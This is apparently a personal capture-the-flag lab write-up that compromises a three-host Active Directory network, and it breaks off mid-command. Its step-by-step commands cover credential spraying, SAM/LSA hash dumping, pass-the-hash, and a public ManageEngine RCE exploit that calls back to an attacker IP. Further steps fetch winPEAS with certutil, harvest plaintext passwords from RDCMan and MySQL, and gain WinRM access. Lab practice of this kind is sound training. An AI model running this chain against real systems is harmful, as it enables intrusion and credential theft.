Given basic credentials for `192.168.203.95`
`Eric.Wallows:EricLikesRunning800`

I assume this is an AD set with 3 machines. Enumerate with netexec smb
```
└─$ nxc smb 192.168.203.95 192.168.203.96 192.168.203.97
SMB         192.168.203.97  445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:secura.yzx) (signing:True) (SMBv1:True) (Null Auth:True)                                                           
SMB         192.168.203.96  445    ERA              [*] Windows 10 / Server 2019 Build 19041 x64 (name:ERA) (domain:secura.yzx) (signing:False) (SMBv1:None)
SMB         192.168.203.95  445    SECURE           [*] Windows 10 / Server 2019 Build 19041 x64 (name:SECURE) (domain:secura.yzx) (signing:False) (SMBv1:None)     
```

**Fix name resolution first** . Add to `/etc/hosts`:
```
192.168.203.97  dc01.secura.yzx secura.yzx dc01
192.168.203.96  era.secura.yzx  era
192.168.203.95  secure.secura.yzx secure
```

Run an nmap scan on .95 because it is the only one with credentials provided. Realise that port 3389(rdp) is open. 
```
└─$ nmap -sVC -p- -v -T4 -sT --open 192.168.203.95
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-19 07:30 -0500
Scanning secure.secura.yzx (192.168.203.95) [65535 ports]
Discovered open port 3389/tcp on 192.168.203.95
Discovered open port 445/tcp on 192.168.203.95
Discovered open port 135/tcp on 192.168.203.95
Discovered open port 139/tcp on 192.168.203.95
Discovered open port 49668/tcp on 192.168.203.95
Discovered open port 47001/tcp on 192.168.203.95
Discovered open port 49666/tcp on 192.168.203.95
Discovered open port 51003/tcp on 192.168.203.95
Discovered open port 5040/tcp on 192.168.203.95
Discovered open port 44444/tcp on 192.168.203.95
Discovered open port 49699/tcp on 192.168.203.95
Discovered open port 12000/tcp on 192.168.203.95
Discovered open port 49664/tcp on 192.168.203.95
Discovered open port 49672/tcp on 192.168.203.95
Discovered open port 49667/tcp on 192.168.203.95
Discovered open port 49665/tcp on 192.168.203.95
Discovered open port 5985/tcp on 192.168.203.95
Discovered open port 49671/tcp on 192.168.203.95
Discovered open port 51004/tcp on 192.168.203.95
Discovered open port 54667/tcp on 192.168.203.95
Discovered open port 49675/tcp on 192.168.203.95
Discovered open port 7680/tcp on 192.168.203.95
Discovered open port 5986/tcp on 192.168.203.95
Discovered open port 8443/tcp on 192.168.203.95
Discovered open port 5001/tcp on 192.168.203.95
Discovered open port 49669/tcp on 192.168.203.95
Discovered open port 49670/tcp on 192.168.203.95
Completed Connect Scan at 07:31, 8.69s elapsed (65535 total ports)
PORT      STATE SERVICE         VERSION
135/tcp   open  msrpc?
139/tcp   open  netbios-ssn?
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server   Microsoft Terminal Services
| ssl-cert: Subject: commonName=secure.secura.yzx
| Issuer: commonName=secure.secura.yzx
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-11-18T12:16:22
| Not valid after:  2027-05-20T12:16:22
| MD5:     264a e516 14bf 745d d64b bdea 29dc f940
| SHA-1:   1649 91c1 7959 0bd2 1922 569c 1002 94b7 72f8 2254
|_SHA-256: 5b27 f9f5 d45c 75d2 3bd0 38c6 b988 fb7a e38d 92fa 1f32 92b3 3eca 4c22 53ae 319f
|_ssl-date: 2026-11-19T12:34:55+00:00; -2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SECURA
|   NetBIOS_Domain_Name: SECURA
|   NetBIOS_Computer_Name: SECURE
|   DNS_Domain_Name: secura.yzx
|   DNS_Computer_Name: secure.secura.yzx
|   DNS_Tree_Name: secura.yzx
|   Product_Version: 10.0.19041
|_  System_Time: 2026-11-19T12:31:14+00:00
5001/tcp  open  commplex-link?
5040/tcp  open  unknown
5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp  open  wsmans?
| ssl-cert: Subject: commonName=Cloudbase-Init WinRM
7680/tcp  open  pando-pub?
8443/tcp  open  ssl/https-alt   AppManager
|_http-server-header: AppManager
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49672/tcp open  unknown
49675/tcp open  tcpwrapped
49699/tcp open  unknown
51003/tcp open  unknown
51004/tcp open  unknown
54667/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port139-TCP:V=7.991%I=7%D=11/19%Time=6AFEEC0E%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,5,"\x83\0\0\x01\x8f");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-11-19T12:31:15
|_  start_date: N/A
```

netexec spray credentials on all three hosts.
```
└─$ nxc smb 192.168.203.95 192.168.203.96 192.168.203.97 -u Eric.Wallows -p 'EricLikesRunning800'
SMB         192.168.203.97  445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:secura.yzx) (signing:True) (SMBv1:True) (Null Auth:True)                                                                  
SMB         192.168.203.96  445    ERA              [*] Windows 10 / Server 2019 Build 19041 x64 (name:ERA) (domain:secura.yzx) (signing:False) (SMBv1:None)
SMB         192.168.203.95  445    SECURE           [*] Windows 10 / Server 2019 Build 19041 x64 (name:SECURE) (domain:secura.yzx) (signing:False) (SMBv1:None)     
SMB         192.168.203.97  445    DC01             [+] secura.yzx\Eric.Wallows:EricLikesRunning800 
SMB         192.168.203.96  445    ERA              [+] secura.yzx\Eric.Wallows:EricLikesRunning800 
SMB         192.168.203.95  445    SECURE           [+] secura.yzx\Eric.Wallows:EricLikesRunning800 (Pwn3d!)
```

Login with xfreerdp and open powershell on the windows GUI.
```
xfreerdp /v:192.168.203.95 /u:Eric.Wallows /p:'EricLikesRunning800' /dynamic-resolution /cert:ignore
```

Map domain with bloodhound
```
bloodhound-python -u Eric.Wallows -p 'EricLikesRunning800' -d secura.yzx -ns 192.168.203.97 -c All --zip
```

==🟢Some explanations of this query that I asked claude about as I am unsure.==
==🟢**`-u Eric.Wallows -p '...'`** — These authenticate you to the DC’s **LDAP** service. AD exposes its entire directory (users, groups, group memberships, ACLs, trusts, sessions) over LDAP, and _any valid domain user_ can read most of it. You don’t need to be admin to run BloodHound — Eric being an ordinary domain user is enough. That’s why AD enumeration is so powerful: low-priv creds reveal the whole map.==

==🟢**`-d secura.yzx`** — The domain to enumerate. BloodHound uses this to build its LDAP queries and the distinguished names (`DC=secura,DC=yzx`) it searches under. It’s telling the tool _which_ directory to walk.==

==🟢**`-ns 192.168.203.97`** — This is the one you’re asking about. `-ns` = **nameserver (DNS)**. BloodHound constantly has to resolve names like `dc01.secura.yzx`, `era.secura.yzx` into IPs while it works. Here’s the thing:==

- ==🟢Your Kali box’s normal DNS (your home router / VPN resolver) has **no idea** what `secura.yzx` is — that’s a private internal AD domain. Ask it and you get nothing.==
- ==🟢In Active Directory, the **DC is almost always the domain’s DNS server.** It holds all the records for `*.secura.yzx`. So you point BloodHound’s resolver at the DC.==

==🟢**Why `-ns` is .97 and not .95 (the box we own):** because **SECURE isn’t a DNS server.** Owning a machine doesn’t mean it can answer DNS queries for the domain — member boxes forward their own DNS to the DC anyway. DNS for `secura.yzx` lives on the DC, so that’s where you point `-ns`, regardless of which host you’ve compromised. Ownership and DNS role are unrelated.==

On the windows GUI
```
PS C:\Users\Eric.Wallows> whoami /all
USER INFORMATION
----------------
User Name           SID
=================== ==============================================
secura\eric.wallows S-1-5-21-3453094141-4163309614-2941200192-4101

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                     
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544 Group used for deny only                       
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192            

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Tried different ways of dumping sam and lsa. One with netexec. The other with impacket-secretsdump.
```
└─$ nxc smb 192.168.203.95 -u Eric.Wallows -p 'EricLikesRunning800' --sam --lsa
SMB         192.168.203.95  445    SECURE           [*] Windows 10 / Server 2019 Build 19041 x64 (name:SECURE) (domain:secura.yzx) (signing:False) (SMBv1:None)    
SMB         192.168.203.95  445    SECURE           [+] secura.yzx\Eric.Wallows:EricLikesRunning800 (Pwn3d!)
SMB         192.168.203.95  445    SECURE           [*] Dumping SAM hashes
SMB         192.168.203.95  445    SECURE           Administrator:500:aad3b435b51404eeaad3b435b51404ee:a51493b0b06e5e35f855245e71af1d14:::
SMB         192.168.203.95  445    SECURE           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.203.95  445    SECURE           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.203.95  445    SECURE           WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
SMB         192.168.203.95  445    SECURE           cloudbase-init:1002:aad3b435b51404eeaad3b435b51404ee:741782ca06062f9021df0604fc0202b9:::
SMB         192.168.203.95  445    SECURE           Admin:1003:aad3b435b51404eeaad3b435b51404ee:77bee68f726150fe0fad773ca0364263:::
SMB         192.168.203.95  445    SECURE           [+] Added 6 SAM hashes to the database
SMB         192.168.203.95  445    SECURE           [*] Dumping LSA secrets
SMB         192.168.203.95  445    SECURE           SECURA.YZX/eric.wallows:$DCC2$10240#eric.wallows#28c1cc0c4fa49db338857157d3aded70: (2026-11-19 12:48:20)
SMB         192.168.203.95  445    SECURE           SECURA\SECURE$:aes256-cts-hmac-sha1-96:e2ebcdebeb9e925d02920635260f5fbe247cb89103634cba46e3c9c4ce9a7e76
SMB         192.168.203.95  445    SECURE           SECURA\SECURE$:aes128-cts-hmac-sha1-96:81160abf76bce99511d2cd1a8829102c
SMB         192.168.203.95  445    SECURE           SECURA\SECURE$:des-cbc-md5:aeeca810e6685bea
SMB         192.168.203.95  445    SECURE           SECURA\SECURE$:plain_password_hex:f0f07d0cc698a971ded4929818d0dc58821f4dcb406a84d0e5f6b3178d7a57dc2c4151efb908524765c3c86faf30337fc4c84a536427a82521f9ebed349a294ed4fde6b83c780e17abdcbf11b0d98520c5285bb456210796e486200924ba9ead3b11248fa1c04d391888e4aa3816462e2aa70998f54b46501409caedee92e8f80070aea1b38579b0b52ee25ca62015253cd6b312e101128bb264601337fb8c0d17107f8008283bd31d1e9f64f1a4d7eb59081196f4a524e61d2c1efb01957285e83148dbdd1687156af9881d7840159dd9e5b89c3e6f149520560a7bf28e654536419fefa18b5b955887d8be23c4e32c                                                          
SMB         192.168.203.95  445    SECURE           SECURA\SECURE$:aad3b435b51404eeaad3b435b51404ee:11c2eb4536b9ff9b20f46946b25cf615:::
SMB         192.168.203.95  445    SECURE           dpapi_machinekey:0x9aacf2053358fe54153ab16c4ee50b08efc72f48
dpapi_userkey:0xe2328bc9bb89ee0c21b62f86a6f6b438ad9c54cd
SMB         192.168.203.95  445    SECURE           cloudbase-init:chGJVvWayC3hLkmvZ5cE
SMB         192.168.203.95  445    SECURE           [+] Dumped 8 LSA secrets to /home/kali/.nxc/logs/lsa/SECURE_192.168.203.95_2026-11-19_080957.secrets and /home/kali/.nxc/logs/lsa/SECURE_192.168.203.95_2026-11-19_080957.cached
```

```
└─$ impacket-secretsdump secura.yzx/Eric.Wallows:'EricLikesRunning800'@192.168.203.95
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x1a501299012ec31dbdad0e56df04d395
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a51493b0b06e5e35f855245e71af1d14:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
cloudbase-init:1002:aad3b435b51404eeaad3b435b51404ee:741782ca06062f9021df0604fc0202b9:::
Admin:1003:aad3b435b51404eeaad3b435b51404ee:77bee68f726150fe0fad773ca0364263:::
[*] Dumping cached domain logon information (domain/username:hash)
SECURA.YZX/eric.wallows:$DCC2$10240#eric.wallows#28c1cc0c4fa49db338857157d3aded70: (2026-11-19 12:48:20+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
SECURA\SECURE$:aes256-cts-hmac-sha1-96:e2ebcdebeb9e925d02920635260f5fbe247cb89103634cba46e3c9c4ce9a7e76
SECURA\SECURE$:aes128-cts-hmac-sha1-96:81160abf76bce99511d2cd1a8829102c
SECURA\SECURE$:des-cbc-md5:aeeca810e6685bea
SECURA\SECURE$:plain_password_hex:f0f07d0cc698a971ded4929818d0dc58821f4dcb406a84d0e5f6b3178d7a57dc2c4151efb908524765c3c86faf30337fc4c84a536427a82521f9ebed349a294ed4fde6b83c780e17abdcbf11b0d98520c5285bb456210796e486200924ba9ead3b11248fa1c04d391888e4aa3816462e2aa70998f54b46501409caedee92e8f80070aea1b38579b0b52ee25ca62015253cd6b312e101128bb264601337fb8c0d17107f8008283bd31d1e9f64f1a4d7eb59081196f4a524e61d2c1efb01957285e83148dbdd1687156af9881d7840159dd9e5b89c3e6f149520560a7bf28e654536419fefa18b5b955887d8be23c4e32c
SECURA\SECURE$:aad3b435b51404eeaad3b435b51404ee:11c2eb4536b9ff9b20f46946b25cf615:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x9aacf2053358fe54153ab16c4ee50b08efc72f48
dpapi_userkey:0xe2328bc9bb89ee0c21b62f86a6f6b438ad9c54cd
[*] NL$KM 
 0000   F1 9F 8D 0A 3D 6B 2D 13  69 96 2E 4C 32 4D C3 66   ....=k-.i..L2M.f
 0010   D5 36 97 AB 1F 0B F2 38  11 3E DF 05 AE DF 31 70   .6.....8.>....1p
 0020   C0 E3 97 A0 08 31 A9 2A  E3 88 48 DD 2C 88 86 56   .....1.*..H.,..V
 0030   83 C9 79 90 03 D5 9D 28  C1 BE 33 D6 0E 7B B7 9B   ..y....(..3..{..
NL$KM:f19f8d0a3d6b2d1369962e4c324dc366d53697ab1f0bf238113edf05aedf3170c0e397a00831a92ae38848dd2c88865683c9799003d59d28c1be33d60e7bb79b
[*] _SC_cloudbase-init 
cloudbase-init:chGJVvWayC3hLkmvZ5cE
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry

```

We have 
`cloudbase-init:chGJVvWayC3hLkmvZ5cE`
and two NT hashes for two local admins
- `Administrator:500:...:a51493b0b06e5e35f855245e71af1d14`
- `Admin:1003:...:77bee68f726150fe0fad773ca0364263`

**Pass-the-Hash the local Administrator across all three** (note `--local-auth`, since 500 is a local account)
**Same with the `Admin` hash:**
```
└─$ nxc smb 192.168.203.95 192.168.203.96 192.168.203.97 -u Administrator -H a51493b0b06e5e35f855245e71af1d14 --local-auth
SMB         192.168.203.97  445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:DC01) (signing:True) (SMBv1:True) (Null Auth:True)                                                                         
SMB         192.168.203.95  445    SECURE           [*] Windows 10 / Server 2019 Build 19041 x64 (name:SECURE) (domain:SECURE) (signing:False) (SMBv1:None)
SMB         192.168.203.96  445    ERA              [*] Windows 10 / Server 2019 Build 19041 x64 (name:ERA) (domain:ERA) (signing:False) (SMBv1:None)
SMB         192.168.203.97  445    DC01             [-] DC01\Administrator:a51493b0b06e5e35f855245e71af1d14 STATUS_LOGON_FAILURE 
SMB         192.168.203.95  445    SECURE           [+] SECURE\Administrator:a51493b0b06e5e35f855245e71af1d14 (Pwn3d!)
SMB         192.168.203.96  445    ERA              [-] ERA\Administrator:a51493b0b06e5e35f855245e71af1d14 STATUS_LOGON_FAILURE 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

└─$ nxc smb 192.168.203.95 192.168.203.96 192.168.203.97 -u Admin -H 77bee68f726150fe0fad773ca0364263 --local-auth
SMB         192.168.203.97  445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:DC01) (signing:True) (SMBv1:True) (Null Auth:True)                                                                        
SMB         192.168.203.95  445    SECURE           [*] Windows 10 / Server 2019 Build 19041 x64 (name:SECURE) (domain:SECURE) (signing:False) (SMBv1:None)
SMB         192.168.203.96  445    ERA              [*] Windows 10 / Server 2019 Build 19041 x64 (name:ERA) (domain:ERA) (signing:False) (SMBv1:None)
SMB         192.168.203.97  445    DC01             [-] DC01\Admin:77bee68f726150fe0fad773ca0364263 STATUS_LOGON_FAILURE 
SMB         192.168.203.95  445    SECURE           [-] SECURE\Admin:77bee68f726150fe0fad773ca0364263 STATUS_PASSWORD_MUST_CHANGE 
SMB         192.168.203.96  445    ERA              [-] ERA\Admin:77bee68f726150fe0fad773ca0364263 STATUS_LOGON_FAILURE 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Try `cloudbase-init:chGJVvWayC3hLkmvZ5cE`
```
└─$ nxc smb 192.168.203.95 192.168.203.96 192.168.203.97 -u cloudbase-init -p 'chGJVvWayC3hLkmvZ5cE'
SMB         192.168.203.97  445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:secura.yzx) (signing:True) (SMBv1:True) (Null Auth:True)                                                                                                                                             
SMB         192.168.203.95  445    SECURE           [*] Windows 10 / Server 2019 Build 19041 x64 (name:SECURE) (domain:secura.yzx) (signing:False) (SMBv1:None)                                                                                                                                                         
SMB         192.168.203.96  445    ERA              [*] Windows 10 / Server 2019 Build 19041 x64 (name:ERA) (domain:secura.yzx) (signing:False) (SMBv1:None)
SMB         192.168.203.97  445    DC01             [-] secura.yzx\cloudbase-init:chGJVvWayC3hLkmvZ5cE STATUS_LOGON_FAILURE 
SMB         192.168.203.95  445    SECURE           [-] secura.yzx\cloudbase-init:chGJVvWayC3hLkmvZ5cE STATUS_LOGON_FAILURE 
SMB         192.168.203.96  445    ERA              [-] secura.yzx\cloudbase-init:chGJVvWayC3hLkmvZ5cE STATUS_LOGON_FAILURE 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Try Kerberoasting and AS-REP roasting
```
└─$ nxc ldap 192.168.203.97 -u Eric.Wallows -p 'EricLikesRunning800' --kerberoasting kerb.out
LDAP        192.168.203.97  389    DC01             [*] Windows 10 / Server 2016 Build 14393 (name:DC01) (domain:secura.yzx) (signing:None) (channel binding:No TLS cert)                                                                                                                                               
LDAP        192.168.203.97  389    DC01             [+] secura.yzx\Eric.Wallows:EricLikesRunning800 
LDAP        192.168.203.97  389    DC01             [*] Skipping disabled account: krbtgt
LDAP        192.168.203.97  389    DC01             [*] Total of records returned 0

└─$ nxc ldap 192.168.203.97 -u Eric.Wallows -p 'EricLikesRunning800' --asreproast asrep.out
LDAP        192.168.203.97  389    DC01             [*] Windows 10 / Server 2016 Build 14393 (name:DC01) (domain:secura.yzx) (signing:None) (channel binding:No TLS cert)                                                                                                                                               
LDAP        192.168.203.97  389    DC01             [+] secura.yzx\Eric.Wallows:EricLikesRunning800 
LDAP        192.168.203.97  389    DC01             No entries found!
```

This ends our basic enumeration and we are stuck. Go look at the basic briefing and it talks about some service application I need to hunt down. `Manage Engine service`

Under `services.msc`, we found it. And by double clicking we found the path to executable
`"C:\Program Files\ManageEngine\AppManager14\working\wrapper.exe" -s "C:\Program Files\ManageEngine\AppManager14\working\conf\wrapper.conf"`
Go to 
`C:\Program Files\ManageEngine\AppManager14\conf\About`
```
#$Id$
product.build.number=14710
<PROMINENT_KEY>WebNMS\ Version\ x.x=Applications Manager 14 (Build 14710)
```

We get the build number. So now we just need to searchsploit and run the exploit.
```
└─$ searchsploit manageengine 14700
 Exploit Title                         |  Path
ManageEngine Applications Manager 14700 - Remote Code Execution (Authenticated)                                           | java/webapps/48793.py
ManageEngine Desktop Central 8.0.0 build < 80293 - Arbitrary File Upload                                                  | jsp/webapps/29674.txt

searchsploit -m 48793.py       

└─$ python3 -m venv venv
└─$ source venv/bin/activate
└─$ pip install openjdk-11-jdk    
└─$ sudo update-alternatives --config javac
There is 1 choice for the alternative javac (providing /usr/bin/javac).
└─$ pip install requests   
└─$ pip install lxml
```

Asking claude what credentials to use for the exploit
Those creds are for the **Applications Manager web console** — the login page you’d hit in the browser — _not_ your Windows/AD creds and not Eric’s. So `target_url` is the console URL and `username`/`password` are what logs you into that console.

For ManageEngine Applications Manager, the default is:

```
admin : admin
```

That’s the near-universal out-of-the-box credential for these appliances, and lab boxes almost always leave it in place.

Run
```
python3 48793.py https://192.168.203.95:8443 admin admin 192.168.45.216 4444
```

Got a NT/authority session on penelope. Try to find RDCMan settings as told in the briefing
```
C:\Program Files>dir /s /b C:\Users\*RDCMan.settings  
dir /s /b C:\Users\*RDCMan.settings  
C:\Users\Administrator\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings

C:\Program Files>type "C:\Users\Administrator\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings"
type "C:\Users\Administrator\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings"
...
...
  <CredentialsProfiles>
    <credentialsProfiles>
      <credentialsProfile inherit="None">
        <profileName scope="Local">SECURE\apache</profileName>
        <userName>apache</userName>
        <password>New2Era4.!</password>
        <domain>SECURE</domain>
      </credentialsProfile>
    </credentialsProfiles>
  </CredentialsProfiles>
 ...
 ...
```

Got credentials `apache:New2Era4.!`. Why do we need --local-auth?
```
└─$ netexec smb 192.168.203.95 192.168.203.96 192.168.203.97 -u apache -p 'New2Era4.!'                                                                       
...
SMB         192.168.203.96  445    ERA              [*] Windows 10 / Server 2019 Build 19041 x64 (name:ERA) (domain:secura.yzx) (signing:False) (SMBv1:None)
SMB         192.168.203.97  445    DC01             [-] secura.yzx\apache:New2Era4.! STATUS_LOGON_FAILURE 
SMB         192.168.203.95  445    SECURE           [-] secura.yzx\apache:New2Era4.! STATUS_LOGON_FAILURE 
SMB         192.168.203.96  445    ERA              [-] secura.yzx\apache:New2Era4.! STATUS_LOGON_FAILURE 

└─$ netexec smb 192.168.203.95 192.168.203.96 192.168.203.97 -u apache -p 'New2Era4.!' --local-auth
SMB         192.168.203.95  445    SECURE           [*] Windows 10 / Server 2019 Build 19041 x64 (name:SECURE) (domain:SECURE) (signing:False) (SMBv1:None)
SMB         192.168.203.96  445    ERA              [*] Windows 10 / Server 2019 Build 19041 x64 (name:ERA) (domain:ERA) (signing:False) (SMBv1:None)
SMB         192.168.203.97  445    DC01             [-] DC01\apache:New2Era4.! STATUS_LOGON_FAILURE 
SMB         192.168.203.95  445    SECURE           [-] SECURE\apache:New2Era4.! STATUS_LOGON_FAILURE 
SMB         192.168.203.96  445    ERA              [+] ERA\apache:New2Era4.! 
```

**Why local auth was needed here:**

Every Windows machine has _two_ places an account can live:

- The **domain** database (on the DC) — accounts like `Eric.Wallows` that work across the whole `secura.yzx` domain.
- Each machine’s **own local** account database (the SAM) — accounts that exist _only_ on that one box.

Those two flags tell netexec _which database to check the credential against_:

- **Without `--local-auth`** → it asks the **domain**: “Hey DC, is there a `secura.yzx\apache`?” The DC says “no such domain user” → `STATUS_LOGON_FAILURE`.
- **With `--local-auth`** → it asks **each machine’s own SAM**: “ERA, do _you_ have a local account `apache`?” ERA says “yes” → `[+]`.

You can even see it in the output — look at the `domain:` field:

- First run: `(domain:secura.yzx)` on all three — treating them as domain members.
- Second run: `(domain:ERA)`, `(domain:SECURE)`, `(domain:DC01)` — each box treated as its own standalone authority (its computer name).


From nmap scan, we got no rdp port 3389 on 192.168.203.96. We will try winrm then (port 5985-5986). 
```
nxc winrm 192.168.203.96 -u apache -p 'New2Era4.!' --local-auth
WINRM 192.168.203.96 5985 ERA [*] Windows 10 / Server 2019 Build 19041 (name:ERA) (domain:secura.yzx)  
WINRM 192.168.203.96 5985 ERA [+] ERA\apache:New2Era4.! (Pwn3d!

evil-winrm -i 192.168.203.96 -u apache -p 'New2Era4.!'
```

```
*Evil-WinRM* PS C:\Users\apache.ERA\Desktop> whoami /all

USER INFORMATION
----------------

User Name  SID
========== ==============================================
era\apache S-1-5-21-1316868832-3073753287-3359562679-1003


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Get winpeas cause **no `SeImpersonatePrivilege`**. Use either of the commands below.
```
certutil -urlcache -split -f http://192.168.45.216/winPEASx64.exe winpeas.exe
wget http://192.168.45.216/winPEASx64.exe -OutFile winpeas.exe
```

I got this from an online tutorial because I have no idea what to do with winpeas. Nothing stand out to me.
From claude:
Trying `root` with a blank password every time you meet MySQL/MariaDB is exactly the right reflex, the same way you’d try `anonymous` on FTP or default creds on a web admin panel. It’s a documented default, not a gamble
```
*Evil-WinRM* PS C:\Users\apache.ERA\Desktop> C:\xampp\mysql\bin\mysqldump.exe -u root --all-databases > db.sql
*Evil-WinRM* PS C:\Users\apache.ERA\Desktop> download db.sql /home/kali/offsec/secura/db.sql
Info: Downloading C:\Users\apache.ERA\Desktop\db.sql to /home/kali/offsec/secura/db.sql
Info: Download successful!
```

Go back to kali. In **PowerShell**, `>` writes output as **UTF-16LE**. Convert back to readable UTF-8.
```
iconv -f UTF-16 -t UTF-8 db.sql -o db_utf8.sql

## On line 46
INSERT INTO `creds` VALUES ('administrator','Almost4There8.?'),('charlotte','Game2On4.!');
```

Alternative path:
```
C:\Users\apache.ERA\Desktop> C:\xampp\mysql\bin\mysql.exe -u root -e "show databases;"
Database
creds
information_schema
mysql
performance_schema
phpmyadmin
test
C:\Users\apache.ERA\Desktop> C:\xampp\mysql\bin\mysql.exe -u root -e "use creds; show tables;"
Tables_in_creds
creds
C:\xampp\mysql\bin\mysql.exe -u root -e "select * from creds.creds;"
*Evil-WinRM* PS C:\Users\apache.ERA\Desktop> C:\xampp\mysql\bin\mysql.exe -u root -e "select * from creds.creds;"
name    pass
administrator   Almost4There8.?
charlotte       Game2On4.!
```

`administrator:Almost4There8.?` and `charlotte:Game2On4.!`

```
┌──(venv)─(kali㉿kali)-[~/Documents/peas]
└─$ netexec smb 192.168.203.95 192.168.203.96 192.168.203.97 -u charlotte -p 'Game2On4.!' --local-auth
SMB         192.168.203.97  445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:DC01) (signing:True) (SMBv1:True) (Null Auth:True)                                                                                                                                                   
